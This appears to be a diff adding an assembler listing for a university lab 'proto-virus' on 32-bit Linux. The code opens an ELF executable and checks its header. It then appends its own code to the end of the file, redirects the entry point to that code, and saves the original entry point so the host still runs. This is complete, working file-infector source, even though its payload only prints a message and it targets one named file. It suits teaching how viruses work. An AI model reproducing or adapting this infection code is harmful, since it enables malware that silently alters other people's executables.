@@ -1,0 +1,265 @@
+     1                                  %macro	syscall1 2
+     2                                  	mov	ebx, %2
+     3                                  	mov	eax, %1
+     4                                  	int	0x80
+     5                                  %endmacro
+     6                                  
+     7                                  %macro	syscall3 4
+     8                                  	mov	edx, %4
+     9                                  	mov	ecx, %3
+    10                                  	mov	ebx, %2
+    11                                  	mov	eax, %1
+    12                                  	int	0x80
+    13                                  %endmacro
+    14                                  
+    15                                  %macro  exit 1
+    16                                  	syscall1 1, %1
+    17                                  %endmacro
+    18                                  
+    19                                  %macro  write 3
+    20                                  	syscall3 4, %1, %2, %3
+    21                                  %endmacro
+    22                                  
+    23                                  %macro  read 3
+    24                                  	syscall3 3, %1, %2, %3
+    25                                  %endmacro
+    26                                  
+    27                                  %macro  open 3
+    28                                  	syscall3 5, %1, %2, %3
+    29                                  %endmacro
+    30                                  
+    31                                  %macro  lseek 3
+    32                                  	syscall3 19, %1, %2, %3
+    33                                  %endmacro
+    34                                  
+    35                                  %macro  close 1
+    36                                  	syscall1 6, %1
+    37                                  %endmacro
+    38                                  
+    39                                  %define	STK_RES	200
+    40                                  %define	RDWR	2
+    41                                  %define	SEEK_END 2
+    42                                  %define SEEK_SET 0
+    43                                  
+    44                                  %define ENTRY		24
+    45                                  %define PHDR_start	28
+    46                                  %define	PHDR_size	32
+    47                                  %define PHDR_memsize	20	
+    48                                  %define PHDR_filesize	16
+    49                                  %define	PHDR_offset	4
+    50                                  %define	PHDR_vaddr	8
+    51                                  %define ELFHDR_size 52
+    52                                  %define ELFHDR_phoff	28
+    53                                  	
+    54                                  	global _start
+    55                                  
+    56                                  	section .text
+    57                                  _start:	
+    58 00000000 55                      	push	ebp
+    59 00000001 89E5                    	mov	ebp, esp
+    60 00000003 81ECC8000000            	sub	esp, STK_RES           
+    61                                  	;CODE START
+    62                                  	open_file:
+    63 00000009 E8E8010000              		call get_my_loc		
+    64 0000000E 83E94B                  		sub ecx, next_i-FileName
+    65 00000011 89C8                    		mov eax, ecx
+    66                                  		open eax, RDWR, 0777	
+    66                              <1>  syscall3 5, %1, %2, %3
+    66 00000013 BA09030000          <2>  mov edx, %4
+    66 00000018 B902000000          <2>  mov ecx, %3
+    66 0000001D 89C3                <2>  mov ebx, %2
+    66 0000001F B805000000          <2>  mov eax, %1
+    66 00000024 CD80                <2>  int 0x80
+    67 00000026 83F8FF                  		cmp eax, -1		
+    68 00000029 0F8E51010000            		jle	fail						
+    69                                  		
+    70 0000002F 89C7                    		mov edi, eax					
+    71                                  	check_magic_numbers:
+    72                                  		read edi, ebp, 4							
+    72                              <1>  syscall3 3, %1, %2, %3
+    72 00000031 BA04000000          <2>  mov edx, %4
+    72 00000036 89E9                <2>  mov ecx, %3
+    72 00000038 89FB                <2>  mov ebx, %2
+    72 0000003A B803000000          <2>  mov eax, %1
+    72 0000003F CD80                <2>  int 0x80
+    73 00000041 817D007F454C46          		cmp dword[ebp], 0x464C457F
+    74 00000048 0F8532010000            		jne fail
+    75                                  	check_ET_EXEC_file:
+    76                                  		lseek edi, 0x10, SEEK_SET
+    76                              <1>  syscall3 19, %1, %2, %3
+    76 0000004E BA00000000          <2>  mov edx, %4
+    76 00000053 B910000000          <2>  mov ecx, %3
+    76 00000058 89FB                <2>  mov ebx, %2
+    76 0000005A B813000000          <2>  mov eax, %1
+    76 0000005F CD80                <2>  int 0x80
+    77                                  		read edi, ebp, 2										
+    77                              <1>  syscall3 3, %1, %2, %3
+    77 00000061 BA02000000          <2>  mov edx, %4
+    77 00000066 89E9                <2>  mov ecx, %3
+    77 00000068 89FB                <2>  mov ebx, %2
+    77 0000006A B803000000          <2>  mov eax, %1
+    77 0000006F CD80                <2>  int 0x80
+    78 00000071 66837D0002              		cmp word[ebp], 0x0002
+    79 00000076 0F8504010000            		jne fail
+    80                                  	
+    81                                  	save_previous_entry:
+    82                                  		lseek edi, 0x18, SEEK_SET				
+    82                              <1>  syscall3 19, %1, %2, %3
+    82 0000007C BA00000000          <2>  mov edx, %4
+    82 00000081 B918000000          <2>  mov ecx, %3
+    82 00000086 89FB                <2>  mov ebx, %2
+    82 00000088 B813000000          <2>  mov eax, %1
+    82 0000008D CD80                <2>  int 0x80
+    83                                  		read edi, previous_entry_point, 4
+    83                              <1>  syscall3 3, %1, %2, %3
+    83 0000008F BA04000000          <2>  mov edx, %4
+    83 00000094 B9[04000000]        <2>  mov ecx, %3
+    83 00000099 89FB                <2>  mov ebx, %2
+    83 0000009B B803000000          <2>  mov eax, %1
+    83 000000A0 CD80                <2>  int 0x80
+    84                                  	infect_file:
+    85                                  		; go to the end of the file
+    86                                  		lseek edi, 0, SEEK_END
+    86                              <1>  syscall3 19, %1, %2, %3
+    86 000000A2 BA02000000          <2>  mov edx, %4
+    86 000000A7 B900000000          <2>  mov ecx, %3
+    86 000000AC 89FB                <2>  mov ebx, %2
+    86 000000AE B813000000          <2>  mov eax, %1
+    86 000000B3 CD80                <2>  int 0x80
+    87 000000B5 89C6                    		mov esi, eax				
+    88                                  		write edi, infect_from_here, virus_end - infect_from_here		
+    88                              <1>  syscall3 4, %1, %2, %3
+    88 000000B7 BAA6000000          <2>  mov edx, %4
+    88 000000BC B9[5B010000]        <2>  mov ecx, %3
+    88 000000C1 89FB                <2>  mov ebx, %2
+    88 000000C3 B804000000          <2>  mov eax, %1
+    88 000000C8 CD80                <2>  int 0x80
+    89                                  
+    90                                  	get_virtual_address:
+    91                                  		lseek edi, 0x3C, SEEK_SET		
+    91                              <1>  syscall3 19, %1, %2, %3
+    91 000000CA BA00000000          <2>  mov edx, %4
+    91 000000CF B93C000000          <2>  mov ecx, %3
+    91 000000D4 89FB                <2>  mov ebx, %2
+    91 000000D6 B813000000          <2>  mov eax, %1
+    91 000000DB CD80                <2>  int 0x80
+    92                                  		read edi, ebp, 4				
+    92                              <1>  syscall3 3, %1, %2, %3
+    92 000000DD BA04000000          <2>  mov edx, %4
+    92 000000E2 89E9                <2>  mov ecx, %3
+    92 000000E4 89FB                <2>  mov ebx, %2
+    92 000000E6 B803000000          <2>  mov eax, %1
+    92 000000EB CD80                <2>  int 0x80
+    93 000000ED 89E9                    		mov ecx, ebp
+    94 000000EF 0331                    		add esi, dword[ecx]
+    95 000000F1 8935[08000000]          		mov dword[new_entry_point], esi
+    96                                  	change_entry_point:
+    97                                  		lseek edi, 0x18, SEEK_SET			
+    97                              <1>  syscall3 19, %1, %2, %3
+    97 000000F7 BA00000000          <2>  mov edx, %4
+    97 000000FC B918000000          <2>  mov ecx, %3
+    97 00000101 89FB                <2>  mov ebx, %2
+    97 00000103 B813000000          <2>  mov eax, %1
+    97 00000108 CD80                <2>  int 0x80
+    98                                  		
+    99                                  		write edi, new_entry_point, 4		
+    99                              <1>  syscall3 4, %1, %2, %3
+    99 0000010A BA04000000          <2>  mov edx, %4
+    99 0000010F B9[08000000]        <2>  mov ecx, %3
+    99 00000114 89FB                <2>  mov ebx, %2
+    99 00000116 B804000000          <2>  mov eax, %1
+    99 0000011B CD80                <2>  int 0x80
+   100                                  		write 1, OutStr, 31
+   100                              <1>  syscall3 4, %1, %2, %3
+   100 0000011D BA1F000000          <2>  mov edx, %4
+   100 00000122 B9[BE010000]        <2>  mov ecx, %3
+   100 00000127 BB01000000          <2>  mov ebx, %2
+   100 0000012C B804000000          <2>  mov eax, %1
+   100 00000131 CD80                <2>  int 0x80
+   101                                  	set_prev_entry_point:
+   102                                  		lseek edi, -4, SEEK_END	
+   102                              <1>  syscall3 19, %1, %2, %3
+   102 00000133 BA02000000          <2>  mov edx, %4
+   102 00000138 B9FCFFFFFF          <2>  mov ecx, %3
+   102 0000013D 89FB                <2>  mov ebx, %2
+   102 0000013F B813000000          <2>  mov eax, %1
+   102 00000144 CD80                <2>  int 0x80
+   103                                  		break_here:
+   104                                  		write edi, previous_entry_point, 4		
+   104                              <1>  syscall3 4, %1, %2, %3
+   104 00000146 BA04000000          <2>  mov edx, %4
+   104 0000014B B9[04000000]        <2>  mov ecx, %3
+   104 00000150 89FB                <2>  mov ebx, %2
+   104 00000152 B804000000          <2>  mov eax, %1
+   104 00000157 CD80                <2>  int 0x80
+   105 00000159 EB40                    		jmp VirusExit
+   106                                  		
+   107                                  infect_from_here:
+   108                                  	print_sucess:
+   109 0000015B E896000000              		call get_my_loc				
+   110 00000160 83E93D                  		sub ecx, next_i-OutStr
+   111                                  		write 1, ecx, 31
+   111                              <1>  syscall3 4, %1, %2, %3
+   111 00000163 BA1F000000          <2>  mov edx, %4
+   111 00000168 89C9                <2>  mov ecx, %3
+   111 0000016A BB01000000          <2>  mov ebx, %2
+   111 0000016F B804000000          <2>  mov eax, %1
+   111 00000174 CD80                <2>  int 0x80
+   112                                  	
+   113                                  	get_back_to_old_entry_point:
+   114 00000176 E87B000000              		call get_my_loc
+   115 0000017B 83E9FE                  		sub ecx, next_i-PreviousEntryPoint
+   116 0000017E FF21                    		jmp [ecx]
+   117                                  
+   118                                  	;fail
+   119                                  	fail:
+   120 00000180 E871000000              		call get_my_loc				
+   121 00000185 83E91D                  		sub ecx, next_i-Failstr
+   122                                  		write 2, ecx, 12
+   122                              <1>  syscall3 4, %1, %2, %3
+   122 00000188 BA0C000000          <2>  mov edx, %4
+   122 0000018D 89C9                <2>  mov ecx, %3
+   122 0000018F BB02000000          <2>  mov ebx, %2
+   122 00000194 B804000000          <2>  mov eax, %1
+   122 00000199 CD80                <2>  int 0x80
+   123                                  
+   124                                  VirusExit:
+   125                                  	   close edi
+   125                              <1>  syscall1 6, %1
+   125 0000019B 89FB                <2>  mov ebx, %2
+   125 0000019D B806000000          <2>  mov eax, %1
+   125 000001A2 CD80                <2>  int 0x80
+   126                                         exit 0            
+   126                              <1>  syscall1 1, %1
+   126 000001A4 BB00000000          <2>  mov ebx, %2
+   126 000001A9 B801000000          <2>  mov eax, %1
+   126 000001AE CD80                <2>  int 0x80
+   127                                                           
+   128                                  
+   129                                  
+   130 000001B0 454C46657865633273-     FileName:	db "ELFexec2short", 0
+   130 000001B9 686F727400         
+   131 000001BE 546865206C61622039-     OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
+   131 000001C7 2070726F746F2D7669-
+   131 000001D0 72757320737472696B-
+   131 000001D9 6573210A00         
+   132 000001DE 70657268617073206E-     Failstr:        db "perhaps not", 10 , 0
+   132 000001E7 6F740A00           
+   133 000001EB 697420776F726B7321-     works_string: db "it works!", 10, 0
+   133 000001F4 0A00               
+   134                                  	
+   135                                  get_my_loc:
+   136 000001F6 E800000000              	call next_i
+   137                                  next_i:
+   138 000001FB 59                      	pop ecx
+   139 000001FC C3                      	ret	
+   140 000001FD [9B010000]              PreviousEntryPoint: dd VirusExit
+   141                                  virus_end:
+   142                                  
+   143                                  
+   144                                  
+   145                                  
+   146                                  section .bss
+   147 00000000 <res 00000004>          var: resd 1
+   148 00000004 <res 00000004>          previous_entry_point: resd 1
+   149 00000008 <res 00000004>          new_entry_point: resd 1
